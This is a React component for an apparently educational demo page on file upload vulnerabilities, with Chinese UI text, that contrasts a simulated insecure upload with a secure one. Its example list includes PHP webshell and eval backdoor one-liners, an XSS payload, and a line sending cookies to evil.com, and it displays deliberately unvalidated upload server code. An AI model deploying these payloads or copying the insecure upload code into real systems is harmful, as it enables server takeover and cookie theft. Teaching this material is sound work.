import { useState, useEffect } from 'react';
import { Typography, Upload, Button, Card, Alert, Tabs, Space, Divider, Tag, Row, Col, List, Result, Progress, notification, Steps, Badge, Modal } from 'antd';
import { 
  UploadOutlined, 
  FileOutlined, 
  FilePdfOutlined, 
  FileImageOutlined, 
  FileWordOutlined,
  FileExcelOutlined,
  FileUnknownOutlined,
  FileZipOutlined,
  FileTextOutlined,
  SafetyOutlined,
  WarningOutlined,
  CheckCircleOutlined,
  CloseCircleOutlined,
  LoadingOutlined,
  BugOutlined,
  InfoCircleOutlined,
  ScanOutlined,
  ExclamationCircleOutlined
} from '@ant-design/icons';
import styled from 'styled-components';
import { UploadResponse } from '../../types';
import apiService from '../../api/api';
import type { UploadFile, UploadProps } from 'antd/es/upload/interface';

const { Title, Paragraph, Text } = Typography;
const { TabPane } = Tabs;
const { Dragger } = Upload;
const { Step } = Steps;

// 样式组件
const CodeBlock = styled.pre`
  background-color: #f6f8fa;
  border-radius: 6px;
  padding: 16px;
  overflow: auto;
  font-family: monospace;
  position: relative;
`;

const ScanningContainer = styled.div`
  margin-top: 16px;
  padding: 16px;
  border: 1px solid #d9d9d9;
  border-radius: 6px;
  background-color: #f5f5f5;
  position: relative;
  overflow: hidden;
`;

const FileIcon = styled.div`
  font-size: 64px;
  text-align: center;
  margin: 20px 0;
  
  .anticon {
    transition: all 0.5s ease;
  }
  
  &.dangerous .anticon {
    color: #ff4d4f;
    animation: pulse 1.5s infinite;
  }
  
  &.safe .anticon {
    color: #52c41a;
  }
  
  @keyframes pulse {
    0% {
      transform: scale(1);
      opacity: 1;
    }
    50% {
      transform: scale(1.1);
      opacity: 0.7;
    }
    100% {
      transform: scale(1);
      opacity: 1;
    }
  }
`;

const FilePreviewContainer = styled.div`
  position: relative;
  padding: 20px;
  min-height: 150px;
  border-radius: 8px;
  background-color: #fafafa;
  margin-bottom: 16px;
  text-align: center;
  overflow: hidden;
`;

const ScanningAnimation = styled.div`
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: linear-gradient(
    to right,
    rgba(0, 153, 255, 0) 0%,
    rgba(0, 153, 255, 0.2) 50%,
    rgba(0, 153, 255, 0) 100%
  );
  z-index: 1;
  animation: scanAnimation 2s linear infinite;
  
  @keyframes scanAnimation {
    0% {
      transform: translateX(-100%);
    }
    100% {
      transform: translateX(100%);
    }
  }
`;

const ThreatDetectedAnimation = styled.div`
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: rgba(255, 0, 0, 0.1);
  z-index: 1;
  animation: threatPulse 2s infinite;
  
  @keyframes threatPulse {
    0% {
      opacity: 0.1;
    }
    50% {
      opacity: 0.3;
    }
    100% {
      opacity: 0.1;
    }
  }
`;

const ThoughtBubble = styled.div`
  position: relative;
  background: #fff;
  border-radius: 10px;
  padding: 15px;
  margin-top: 20px;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
  
  &:after {
    content: '';
    position: absolute;
    top: -10px;
    left: 20px;
    border-width: 0 10px 10px;
    border-style: solid;
    border-color: #fff transparent;
    display: block;
    width: 0;
  }
`;

const StepItem = styled.div`
  padding: 8px 0;
  display: flex;
  align-items: center;
  
  .icon {
    margin-right: 8px;
    color: #1890ff;
  }
  
  &.completed .icon {
    color: #52c41a;
  }
  
  &.error .icon {
    color: #ff4d4f;
  }
`;

const HackerTypingEffect = styled.div`
  font-family: 'Courier New', monospace;
  background-color: #000;
  color: #33ff33;
  padding: 10px;
  border-radius: 4px;
  margin-top: 10px;
  height: 60px;
  overflow: hidden;
  position: relative;
  
  .cursor {
    display: inline-block;
    width: 8px;
    height: 16px;
    background-color: #33ff33;
    animation: blink 1s step-end infinite;
  }
  
  @keyframes blink {
    50% { opacity: 0; }
  }
`;

// 危险文件类型
const dangerousFileTypes = ['.php', '.jsp', '.aspx', '.exe', '.sh', '.js', '.html'];

// 恶意文件上传示例
const maliciousFileExamples = [
  {
    name: "PHP Webshell",
    description: "允许攻击者远程执行命令的PHP后门脚本",
    code: "<?php system($_GET['cmd']); ?>",
    extension: ".php",
    risk: "高"
  },
  {
    name: "JS Cookie窃取",
    description: "JavaScript脚本用于窃取Cookie",
    code: "document.location='http://evil.com/steal.php?cookie='+document.cookie",
    extension: ".js",
    risk: "中"
  },
  {
    name: "HTML XSS攻击",
    description: "包含XSS攻击的HTML文件",
    code: "<script>alert(document.cookie)</script>",
    extension: ".html",
    risk: "中"
  },
  {
    name: "假图片PHP后门",
    description: "伪装成PNG的PHP后门",
    code: "<?php eval($_POST['cmd']); ?>\n<!-- 文件头部添加PNG魔术数字以混淆文件类型 -->",
    extension: ".php.png",
    risk: "高"
  }
];

// 根据文件扩展名获取对应图标
const getFileIcon = (filename: string) => {
  const ext = filename.split('.').pop()?.toLowerCase() || '';
  
  switch (ext) {
    case 'pdf':
      return <FilePdfOutlined style={{ fontSize: 48, color: '#ff4d4f' }} />;
    case 'png':
    case 'jpg':
    case 'jpeg':
    case 'gif':
    case 'webp':
      return <FileImageOutlined style={{ fontSize: 48, color: '#1890ff' }} />;
    case 'xlsx':
    case 'xls':
    case 'csv':
      return <FileExcelOutlined style={{ fontSize: 48, color: '#52c41a' }} />;
    case 'doc':
    case 'docx':
      return <FileWordOutlined style={{ fontSize: 48, color: '#1890ff' }} />;
    case 'zip':
    case 'rar':
    case '7z':
      return <FileZipOutlined style={{ fontSize: 48, color: '#faad14' }} />;
    case 'txt':
      return <FileTextOutlined style={{ fontSize: 48, color: '#8c8c8c' }} />;
    case 'html':
    case 'htm':
      return <FileOutlined style={{ fontSize: 48, color: '#ff7a45' }} />;
    case 'php':
    case 'js':
    case 'jsx':
    case 'ts':
    case 'tsx':
      return <FileOutlined style={{ fontSize: 48, color: '#ff4d4f' }} />;
    default:
      return <FileUnknownOutlined style={{ fontSize: 48, color: '#8c8c8c' }} />;
  }
};

const FileUpload = () => {
  const [fileList, setFileList] = useState<UploadFile[]>([]);
  const [secureFileList, setSecureFileList] = useState<UploadFile[]>([]);
  const [uploadResponse, setUploadResponse] = useState<UploadResponse | null>(null);
  const [secureUploadResponse, setSecureUploadResponse] = useState<UploadResponse | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [secureError, setSecureError] = useState<string | null>(null);
  const [isMalicious, setIsMalicious] = useState<boolean>(false);
  const [threatDetails, setThreatDetails] = useState<string | null>(null);
  const [isScanning, setIsScanning] = useState<boolean>(false);
  const [scanProgress, setScanProgress] = useState<number>(0);
  const [scanResult, setScanResult] = useState<string | null>(null);
  const [currentStep, setCurrentStep] = useState<number>(0);
  const [showThoughtBubble, setShowThoughtBubble] = useState<boolean>(false);
  const [thoughtContent, setThoughtContent] = useState<string>('');
  const [showScanningAnimation, setShowScanningAnimation] = useState<boolean>(false);
  const [scanningWidth, setScanningWidth] = useState<number>(0);
  const [showThreatAnimation, setShowThreatAnimation] = useState<boolean>(false);
  const [currentSteps, setCurrentSteps] = useState<{ key: string; status: string }[]>([]);
  const [hackerTypingText, setHackerTypingText] = useState<string>('');
  const [showHackerTyping, setShowHackerTyping] = useState<boolean>(false);
  const [activeTab, setActiveTab] = useState<string>('1');
  const [uploading, setUploading] = useState<boolean>(false);

  useEffect(() => {
    if (isScanning) {
      const interval = setInterval(() => {
        setScanProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval);
            setIsScanning(false);
            return 100;
          }
          return prev + 10;
        });
        
        // 更新扫描动画宽度
        setScanningWidth(prev => {
          if (prev >= 100) {
            return 100;
          }
          return prev + 10;
        });
      }, 200);
      
      return () => clearInterval(interval);
    }
  }, [isScanning]);

  // 不安全的文件上传处理
  const handleVulnerableUpload: UploadProps['customRequest'] = async (options) => {
    const { file, onSuccess, onError } = options;
    const filename = (file as any).name;
    
    setUploading(true);
    setUploadResponse(null);
    setError(null);
    setIsScanning(true);
    setScanProgress(0);
    setShowScanningAnimation(true);
    setShowThoughtBubble(false);
    
    // 模拟扫描进度
    const progressInterval = setInterval(() => {
      setScanProgress(prevProgress => {
        if (prevProgress >= 95) {
          clearInterval(progressInterval);
          return prevProgress;
        }
        return prevProgress + Math.floor(Math.random() * 10) + 1;
      });
    }, 200);
    
    // 显示扫描过程
    let currentStep = 0;
    setCurrentSteps([{ key: 'start', status: 'processing' }]);
    
    const scanSteps = [
      { key: 'start', label: '开始扫描文件' },
      { key: 'check_format', label: '检查文件格式' },
      { key: 'analyze', label: '分析文件内容' },
      { key: 'decision', label: '决定是否允许上传' }
    ];
    
    const updateSteps = (index: number, status: 'processing' | 'finish' | 'error' = 'processing') => {
      setCurrentSteps(prev => {
        const updated = [...prev];
        if (prev[index]) {
          updated[index] = { ...prev[index], status };
        }
        if (index + 1 < scanSteps.length && status === 'finish') {
          updated[index + 1] = { key: scanSteps[index + 1].key, status: 'processing' };
        }
        return updated;
      });
    };
    
    // 延迟执行每个步骤以展示过程
    await new Promise(resolve => setTimeout(resolve, 800));
    updateSteps(0, 'finish');
    
    await new Promise(resolve => setTimeout(resolve, 700));
    updateSteps(1, 'finish');
    
    // 检查是否是危险文件类型
    const fileExt = filename.toLowerCase().split('.').pop() || '';
    const isDangerous = dangerousFileTypes.includes(`.${fileExt}`) || 
                        filename.includes('.php.') || 
                        filename.includes('.jsp.') || 
                        filename.includes('.asp.');
    
    // 显示"服务器思考"气泡
    setShowThoughtBubble(true);
    if (isDangerous) {
      setThoughtContent('这是一个危险的文件类型，但由于没有验证，我会接受它。这可能允许攻击者执行恶意代码！');
    } else {
      setThoughtContent('这个文件看起来是安全的文件类型，我会接受它。');
    }
    
    await new Promise(resolve => setTimeout(resolve, 1000));
    updateSteps(2, 'finish');
    
    await new Promise(resolve => setTimeout(resolve, 600));
    
    try {
      // 模拟API上传
      await new Promise(resolve => setTimeout(resolve, 800));
      clearInterval(progressInterval);
      setScanProgress(100);
      
      // 更新最后一个步骤状态
      updateSteps(3, 'finish');
      
      const response = {
        success: true,
        path: `/uploads/${filename}`,
        is_dangerous: isDangerous,
        filename: filename
      };
      
      setUploadResponse(response);
      onSuccess && onSuccess(response as any);
      
      if (isDangerous) {
        notification.error({
          message: '安全警告',
          description: '已上传可能包含恶意代码的文件！在生产环境中，这可能导致服务器被攻击。',
          duration: 0
        });
        setShowThoughtBubble(true);
        setThoughtContent('文件已成功上传。由于没有验证文件类型，恶意文件也被接受了。这是一个严重的安全漏洞！');
        setShowThreatAnimation(true);
      } else {
        notification.success({
          message: '上传成功',
          description: '文件已成功上传到服务器。'
        });
      }
    } catch (err: any) {
      console.error('上传失败:', err);
      onError && onError(err);
      setError(err.message || '上传失败');
      updateSteps(3, 'error');
    } finally {
      setUploading(false);
      setIsScanning(false);
      setShowScanningAnimation(false);
    }
  };

  // 安全的文件上传处理
  const handleSecureUpload: UploadProps['customRequest'] = async (options) => {
    const { file, onSuccess, onError } = options;
    const filename = (file as any).name;
    
    setUploading(true);
    setUploadResponse(null);
    setError(null);
    setIsScanning(true);
    setScanProgress(0);
    setShowScanningAnimation(true);
    setShowThoughtBubble(false);
    
    // 模拟扫描进度
    const progressInterval = setInterval(() => {
      setScanProgress(prevProgress => {
        if (prevProgress >= 95) {
          clearInterval(progressInterval);
          return prevProgress;
        }
        return prevProgress + Math.floor(Math.random() * 8) + 1;
      });
    }, 200);
    
    // 显示扫描过程
    let currentStep = 0;
    setCurrentSteps([{ key: 'start', status: 'processing' }]);
    
    const scanSteps = [
      { key: 'start', label: '开始扫描文件' },
      { key: 'check_format', label: '检查文件格式' },
      { key: 'check_mimetype', label: '验证MIME类型' },
      { key: 'analyze', label: '分析文件内容' },
      { key: 'security_check', label: '安全性检查' },
      { key: 'decision', label: '决定是否允许上传' }
    ];
    
    const updateSteps = (index: number, status: 'processing' | 'finish' | 'error' = 'processing') => {
      setCurrentSteps(prev => {
        const updated = [...prev];
        if (prev[index]) {
          updated[index] = { ...prev[index], status };
        }
        if (index + 1 < scanSteps.length && status === 'finish') {
          updated[index + 1] = { key: scanSteps[index + 1].key, status: 'processing' };
        }
        return updated;
      });
    };
    
    // 延迟执行每个步骤以展示过程
    await new Promise(resolve => setTimeout(resolve, 800));
    updateSteps(0, 'finish');
    
    await new Promise(resolve => setTimeout(resolve, 700));
    updateSteps(1, 'finish');
    
    // 检查是否是危险文件类型
    const fileExt = filename.toLowerCase().split('.').pop() || '';
    const isDangerous = dangerousFileTypes.includes(`.${fileExt}`) || 
                        filename.includes('.php.') || 
                        filename.includes('.jsp.') || 
                        filename.includes('.asp.');
    
    // 显示"服务器思考"气泡
    setShowThoughtBubble(true);
    
    await new Promise(resolve => setTimeout(resolve, 800));
    updateSteps(2, 'finish');
    
    await new Promise(resolve => setTimeout(resolve, 700));
    updateSteps(3, 'finish');
    
    if (isDangerous) {
      // 安全版本拒绝危险文件
      setThoughtContent('这是一个危险的文件类型！我会拒绝这个上传请求，因为它可能包含恶意代码。');
      await new Promise(resolve => setTimeout(resolve, 800));
      updateSteps(4, 'error');
      
      clearInterval(progressInterval);
      setScanProgress(100);
      
      setError('安全检查失败：不允许上传可能包含恶意代码的文件类型。');
      notification.error({
        message: '上传被拒绝',
        description: '检测到潜在的危险文件类型。系统拒绝了此上传请求以保护服务器安全。',
        duration: 4
      });
      setShowThreatAnimation(true);
      
      updateSteps(5, 'error');
      onError && onError(new Error('不允许的文件类型'));
    } else {
      // 安全通过
      setThoughtContent('这个文件通过了所有安全检查，我会接受它。');
      await new Promise(resolve => setTimeout(resolve, 800));
      updateSteps(4, 'finish');
      
      await new Promise(resolve => setTimeout(resolve, 700));
      updateSteps(5, 'finish');
      
      try {
        // 模拟安全API上传
        await new Promise(resolve => setTimeout(resolve, 800));
        clearInterval(progressInterval);
        setScanProgress(100);
        
        const response = {
          success: true,
          path: `/uploads/safe_${filename}`,
          is_dangerous: false,
          filename: filename
        };
        
        setUploadResponse(response);
        onSuccess && onSuccess(response as any);
        
        notification.success({
          message: '上传成功',
          description: '文件已经通过安全检查并成功上传。'
        });
      } catch (err: any) {
        console.error('上传失败:', err);
        onError && onError(err);
        setError(err.message || '上传失败');
        updateSteps(5, 'error');
      }
    }
    
    setUploading(false);
    setIsScanning(false);
    setShowScanningAnimation(false);
  };

  // 上传组件配置
  const vulnerableUploadProps: UploadProps = {
    name: 'file',
    multiple: false,
    fileList: fileList,
    customRequest: handleVulnerableUpload,
    showUploadList: {
      showRemoveIcon: true,
    },
    onChange(info) {
      setFileList(info.fileList.slice(-1));
    },
    onRemove() {
      setFileList([]);
      setUploadResponse(null);
      setError(null);
      setIsMalicious(false);
      setThreatDetails(null);
      setScanResult(null);
      setIsScanning(false);
      setScanProgress(0);
      setShowScanningAnimation(false);
      setShowThreatAnimation(false);
    }
  };
  
  // 安全上传组件配置
  const secureUploadProps: UploadProps = {
    name: 'file',
    multiple: false,
    fileList: secureFileList,
    customRequest: handleSecureUpload,
    showUploadList: {
      showRemoveIcon: true,
    },
    onChange(info) {
      setSecureFileList(info.fileList.slice(-1));
    },
    onRemove() {
      setSecureFileList([]);
      setSecureUploadResponse(null);
      setSecureError(null);
      setScanResult(null);
      setIsScanning(false);
      setScanProgress(0);
      setShowScanningAnimation(false);
      setShowThreatAnimation(false);
    }
  };

  // 点击示例按钮创建文件
  const createExampleFile = (example: typeof maliciousFileExamples[0]) => {
    // 模拟创建恶意文件并自动上传
    const filename = `malicious_example${example.extension}`;
    
    notification.info({
      message: '创建测试文件',
      description: `正在创建 "${filename}" 用于演示...`,
      duration: 2
    });
    
    // 显示代码编辑动画
    setHackerTypingText(example.code);
    setShowHackerTyping(true);
    
    // 模拟文件创建和上传
    setTimeout(() => {
      setIsScanning(true);
      setScanProgress(0);
      setShowScanningAnimation(true);
      setShowThoughtBubble(false);
      setHackerTypingText('');
      setShowHackerTyping(false);
      
      const fakeFile = {
        name: filename,
        size: example.code.length,
        type: 'text/plain'
      };
      
      // 选择恶意版本或安全版本上传
      if (activeTab === '1') {
        handleVulnerableUpload({
          file: fakeFile as any,
          onSuccess: () => {},
          onError: () => {},
          onProgress: () => {}
        });
      } else {
        handleSecureUpload({
          file: fakeFile as any,
          onSuccess: () => {},
          onError: () => {},
          onProgress: () => {}
        });
      }
    }, 1500);
  };

  // 生成扫描步骤内容
  const renderScanningSteps = () => {
    if (!currentSteps.length) return null;
    
    const scanSteps = activeTab === '1' ? [
      { key: 'start', label: '开始扫描文件' },
      { key: 'check_format', label: '检查文件格式' },
      { key: 'analyze', label: '分析文件内容' },
      { key: 'decision', label: '决定是否允许上传' }
    ] : [
      { key: 'start', label: '开始扫描文件' },
      { key: 'check_format', label: '检查文件格式' },
      { key: 'check_mimetype', label: '验证MIME类型' },
      { key: 'analyze', label: '分析文件内容' },
      { key: 'security_check', label: '安全性检查' },
      { key: 'decision', label: '决定是否允许上传' }
    ];
    
    return (
      <div style={{ marginTop: 16 }}>
        {currentSteps.map((step, index) => {
          const stepInfo = scanSteps.find(s => s.key === step.key);
          if (!stepInfo) return null;
          
          return (
            <StepItem 
              key={step.key} 
              className={step.status === 'finish' ? 'completed' : step.status === 'error' ? 'error' : ''}
            >
              <span className="icon">
                {step.status === 'processing' ? (
                  <LoadingOutlined />
                ) : step.status === 'finish' ? (
                  <CheckCircleOutlined />
                ) : (
                  <CloseCircleOutlined />
                )}
              </span>
              <span>{stepInfo.label}</span>
            </StepItem>
          );
        })}
      </div>
    );
  };

  // 黑客打字效果渲染
  const renderHackerTyping = () => {
    if (!showHackerTyping) return null;
    
    return (
      <HackerTypingEffect>
        <div>{hackerTypingText}<span className="cursor"></span></div>
      </HackerTypingEffect>
    );
  };

  return (
    <div className="file-upload-page">
      <Title level={2}>
        <BugOutlined /> 文件上传漏洞演示
      </Title>

      <Paragraph>
        不安全的文件上传功能允许用户上传恶意文件到服务器，攻击者可以上传例如PHP、JSP等可执行文件，从而获取服务器权限，
        执行恶意代码，甚至完全控制服务器。本页面演示了安全与不安全的文件上传方式的区别。
      </Paragraph>

      <Alert
        message="安全警告"
        description="此页面仅用于教育目的，演示文件上传漏洞。在实际应用中，请务必验证文件类型、内容和大小，以防止恶意文件上传。"
        type="warning"
        showIcon
        style={{ marginBottom: 24 }}
      />

      <Card title="恶意文件上传示例" style={{ marginBottom: 24 }}>
        <Paragraph>
          以下是一些常见的恶意文件上传示例，您可以在不安全版本中测试这些示例：
        </Paragraph>
        <List
          grid={{ gutter: 16, xs: 1, sm: 1, md: 2, lg: 2, xl: 2, xxl: 3 }}
          dataSource={maliciousFileExamples}
          renderItem={(example) => (
            <List.Item>
              <Card
                title={
                  <Space>
                    <Badge dot color="red" count={example.risk === '高' ? 1 : 0}>
                      <ExclamationCircleOutlined style={{ fontSize: 18, color: '#ff4d4f' }} />
                    </Badge>
                    {example.name}
                    <Tag color={example.risk === '高' ? 'error' : 'warning'}>{example.risk}风险</Tag>
                  </Space>
                }
                size="small"
                extra={
                  <Button 
                    type="primary" 
                    danger 
                    size="small" 
                    onClick={() => createExampleFile(example)}
                  >
                    创建示例
                  </Button>
                }
              >
                <p>{example.description}</p>
                <CodeBlock>
                  <code>{example.code}</code>
                </CodeBlock>
              </Card>
            </List.Item>
          )}
        />
      </Card>

      <Tabs defaultActiveKey="1" style={{ marginBottom: 32 }}>
        <TabPane 
          tab={<span><BugOutlined /> 不安全文件上传 (易受攻击)</span>} 
          key="1"
        >
          <Alert
            message="漏洞提示"
            description="此版本没有对上传的文件类型进行验证，允许任何类型的文件上传到服务器，包括可执行的脚本文件。"
            type="error"
            showIcon
            style={{ marginBottom: 16 }}
          />
          
          <CodeBlock>
            <code>
              // 不安全的文件上传代码 - 没有验证文件类型<br/>
              app.post('/upload', (req, res) =&gt; &lbrace;<br/>
              &nbsp;&nbsp;const file = req.files.file;<br/>
              &nbsp;&nbsp;const path = './uploads/' + file.name;<br/><br/>
              &nbsp;&nbsp;// 直接保存文件，没有验证<br/>
              &nbsp;&nbsp;file.mv(path, (err) =&gt; &lbrace;<br/>
              &nbsp;&nbsp;&nbsp;&nbsp;if (err) return res.status(500).send(err);<br/>
              &nbsp;&nbsp;&nbsp;&nbsp;res.json(&lbrace; success: true, path: path &rbrace;);<br/>
              &nbsp;&nbsp;&rbrace;);<br/>
              &rbrace;);
            </code>
          </CodeBlock>

          <Divider />
          
          <Row gutter={24}>
            <Col xs={24} md={12}>
              <Card title="上传文件" bordered={false}>
                <Dragger {...vulnerableUploadProps}>
                  <p className="ant-upload-drag-icon">
                    <UploadOutlined />
                  </p>
                  <p className="ant-upload-text">点击或拖拽文件到此区域上传</p>
                  <p className="ant-upload-hint">
                    支持任何文件类型，<Text type="danger">包括可执行脚本！</Text>
                  </p>
                </Dragger>
                
                {isScanning && (
                  <ScanningContainer>
                    <Progress percent={scanProgress} status="active" />
                    <div style={{ marginTop: 16 }}>
                      <ScanOutlined spin /> 正在处理文件...
                    </div>
                    {renderScanningSteps()}
                  </ScanningContainer>
                )}
                
                {showThoughtBubble && (
                  <Alert
                    message="服务器思考中..."
                    description={thoughtContent}
                    type="info"
                    showIcon
                    style={{ marginTop: 16 }}
                  />
                )}
              </Card>
            </Col>
            
            <Col xs={24} md={12}>
              <Card title="上传结果" bordered={false}>
                {uploadResponse && !error && (
                  <div>
                    <FilePreviewContainer>
                      {showScanningAnimation && <ScanningAnimation />}
                      {showThreatAnimation && <ThreatDetectedAnimation />}
                      
                      <FileIcon className={uploadResponse.is_dangerous ? 'dangerous' : 'safe'}>
                        {getFileIcon(uploadResponse.path.split('/').pop() || '')}
                      </FileIcon>
                      
                      <div>
                        <Text strong>文件名: </Text>
                        <Text>{uploadResponse.path.split('/').pop()}</Text>
                      </div>
                      
                      <div>
                        <Text strong>状态: </Text>
                        {uploadResponse.is_dangerous ? (
                          <Tag color="error">
                            <WarningOutlined /> 潜在危险文件
                          </Tag>
                        ) : (
                          <Tag color="success">
                            <CheckCircleOutlined /> 安全文件
                          </Tag>
                        )}
                      </div>
                      
                      <div style={{ marginTop: 10 }}>
                        <Text strong>路径: </Text>
                        <Text code>{uploadResponse.path}</Text>
                      </div>
                      
                      {uploadResponse.is_dangerous && (
                        <Alert 
                          message="安全风险警告" 
                          description="此类文件可能包含恶意代码，允许攻击者在服务器上执行任意命令。在生产环境中，这可能导致服务器被完全控制！" 
                          type="error" 
                          showIcon 
                          style={{ marginTop: 16 }}
                        />
                      )}
                    </FilePreviewContainer>
                  </div>
                )}
                
                {error && (
                  <Result
                    status="error"
                    title="上传失败"
                    subTitle={error}
                  />
                )}
                
                {!uploadResponse && !error && !isScanning && (
                  <div style={{ textAlign: 'center', padding: '30px 0' }}>
                    <Text type="secondary">上传文件后将显示结果</Text>
                  </div>
                )}
              </Card>
            </Col>
          </Row>
        </TabPane>
        
        <TabPane 
          tab={<span><SafetyOutlined /> 安全文件上传 (防护示例)</span>} 
          key="2"
        >
          <Alert
            message="安全提示"
            description="此版本对上传的文件类型进行验证，只允许安全的文件类型上传到服务器，拒绝可执行的脚本文件。"
            type="success"
            showIcon
            style={{ marginBottom: 16 }}
          />
          
          <CodeBlock>
            <code>
              // 安全的文件上传代码 - 验证文件类型和内容<br/>
              app.post('/upload', (req, res) =&gt; &lbrace;<br/>
              &nbsp;&nbsp;const file = req.files.file;<br/>
              &nbsp;&nbsp;const fileName = file.name;<br/>
              &nbsp;&nbsp;const fileExt = path.extname(fileName).toLowerCase();<br/><br/>
              &nbsp;&nbsp;// 仅允许安全的文件类型<br/>
              &nbsp;&nbsp;const safeExts = ['.jpg', '.png', '.pdf', '.txt', '.doc', '.docx'];<br/>
              &nbsp;&nbsp;if (!safeExts.includes(fileExt)) &lbrace;<br/>
              &nbsp;&nbsp;&nbsp;&nbsp;return res.status(400).send(&lbrace; error: '不允许的文件类型' &rbrace;);<br/>
              &nbsp;&nbsp;&rbrace;<br/><br/>
              &nbsp;&nbsp;// 检查文件内容的MIME类型<br/>
              &nbsp;&nbsp;const mimeCheck = checkFileMimeType(file);<br/>
              &nbsp;&nbsp;if (!mimeCheck.valid) &lbrace;<br/>
              &nbsp;&nbsp;&nbsp;&nbsp;return res.status(400).send(&lbrace; error: '文件内容与扩展名不匹配' &rbrace;);<br/>
              &nbsp;&nbsp;&rbrace;<br/><br/>
              &nbsp;&nbsp;// 安全地保存文件<br/>
              &nbsp;&nbsp;const safeName = generateSafeName(fileName);<br/>
              &nbsp;&nbsp;const path = './uploads/' + safeName;<br/>
              &nbsp;&nbsp;file.mv(path, (err) =&gt; &lbrace;<br/>
              &nbsp;&nbsp;&nbsp;&nbsp;if (err) return res.status(500).send(err);<br/>
              &nbsp;&nbsp;&nbsp;&nbsp;res.json(&lbrace; success: true, path: path &rbrace;);<br/>
              &nbsp;&nbsp;&rbrace;);<br/>
              &rbrace;);
            </code>
          </CodeBlock>
          
          <Divider />
          
          <Row gutter={24}>
            <Col xs={24} md={12}>
              <Card title="上传文件 (安全版)" bordered={false}>
                <Dragger {...secureUploadProps}>
                  <p className="ant-upload-drag-icon">
                    <UploadOutlined />
                  </p>
                  <p className="ant-upload-text">点击或拖拽文件到此区域上传</p>
                  <p className="ant-upload-hint">
                    <Text type="success">仅支持安全的文件类型: JPG, PNG, PDF, TXT, DOC</Text>
                  </p>
                </Dragger>
                
                {isScanning && (
                  <ScanningContainer>
                    <Progress percent={scanProgress} status="active" />
                    <div style={{ marginTop: 16 }}>
                      <ScanOutlined spin /> 正在扫描文件安全性...
                    </div>
                    {renderScanningSteps()}
                  </ScanningContainer>
                )}
                
                {showThoughtBubble && (
                  <Alert
                    message="安全系统检查中..."
                    description={thoughtContent}
                    type="info"
                    showIcon
                    style={{ marginTop: 16 }}
                  />
                )}
              </Card>
            </Col>
            
            <Col xs={24} md={12}>
              <Card title="上传结果" bordered={false}>
                {secureUploadResponse && !secureError && (
                  <div>
                    <FilePreviewContainer>
                      {showScanningAnimation && <ScanningAnimation />}
                      
                      <FileIcon className={secureUploadResponse.is_dangerous ? 'dangerous' : 'safe'}>
                        {getFileIcon(secureUploadResponse.path.split('/').pop() || '')}
                      </FileIcon>
                      
                      <div>
                        <Text strong>文件名: </Text>
                        <Text>{secureUploadResponse.path.split('/').pop()}</Text>
                      </div>
                      
                      <div>
                        <Text strong>状态: </Text>
                        {secureUploadResponse.is_dangerous ? (
                          <Tag color="error">
                            <WarningOutlined /> 潜在危险文件
                          </Tag>
                        ) : (
                          <Tag color="success">
                            <CheckCircleOutlined /> 安全文件
                          </Tag>
                        )}
                      </div>
                      
                      <div style={{ marginTop: 10 }}>
                        <Text strong>路径: </Text>
                        <Text code>{secureUploadResponse.path}</Text>
                      </div>
                      
                      {secureUploadResponse.is_dangerous && (
                        <Alert 
                          message="安全风险警告" 
                          description="此类文件可能包含恶意代码，允许攻击者在服务器上执行任意命令。在生产环境中，这可能导致服务器被完全控制！" 
                          type="error" 
                          showIcon 
                          style={{ marginTop: 16 }}
                        />
                      )}
                    </FilePreviewContainer>
                  </div>
                )}
                
                {secureError && (
                  <div>
                    <FilePreviewContainer>
                      {showThreatAnimation && <ThreatDetectedAnimation />}
                      
                      <Result
                        status="error"
                        title="上传被阻止"
                        subTitle={secureError}
                        style={{ padding: '20px 0' }}
                      />
                    </FilePreviewContainer>
                    
                    {scanResult === 'blocked' && (
                      <Alert
                        message="安全防护已生效"
                        description="系统成功阻止了潜在恶意文件的上传，保护了服务器安全。"
                        type="success"
                        showIcon
                        style={{ marginTop: 16 }}
                      />
                    )}
                  </div>
                )}
                
                {!secureUploadResponse && !secureError && !isScanning && (
                  <div style={{ textAlign: 'center', padding: '30px 0' }}>
                    <Text type="secondary">上传文件后将显示结果</Text>
                  </div>
                )}
              </Card>
            </Col>
          </Row>
        </TabPane>
      </Tabs>

      <Card title="文件上传漏洞防护建议" style={{ marginBottom: 24 }}>
        <Row gutter={[16, 16]}>
          <Col xs={24} md={8}>
            <Card title="文件类型验证" size="small">
              <ul>
                <li>验证文件扩展名，只允许安全的文件类型</li>
                <li>检查文件的MIME类型</li>
                <li>确保文件扩展名与内容类型匹配</li>
              </ul>
            </Card>
          </Col>
          <Col xs={24} md={8}>
            <Card title="文件内容检查" size="small">
              <ul>
                <li>扫描文件内容中的恶意代码</li>
                <li>使用防病毒软件检查文件</li>
                <li>限制文件大小，防止DOS攻击</li>
              </ul>
            </Card>
          </Col>
          <Col xs={24} md={8}>
            <Card title="存储与权限" size="small">
              <ul>
                <li>文件重命名，使用随机文件名</li>
                <li>将文件存储在Web根目录之外</li>
                <li>设置适当的文件系统权限</li>
              </ul>
            </Card>
          </Col>
        </Row>
      </Card>

      <Alert
        message="漏洞影响"
        description="不安全的文件上传可能导致：远程代码执行、服务器接管、数据泄露、网站篡改或被用作攻击其他系统的跳板。"
        type="warning"
        showIcon
      />
    </div>
  );
};

export default FileUpload; 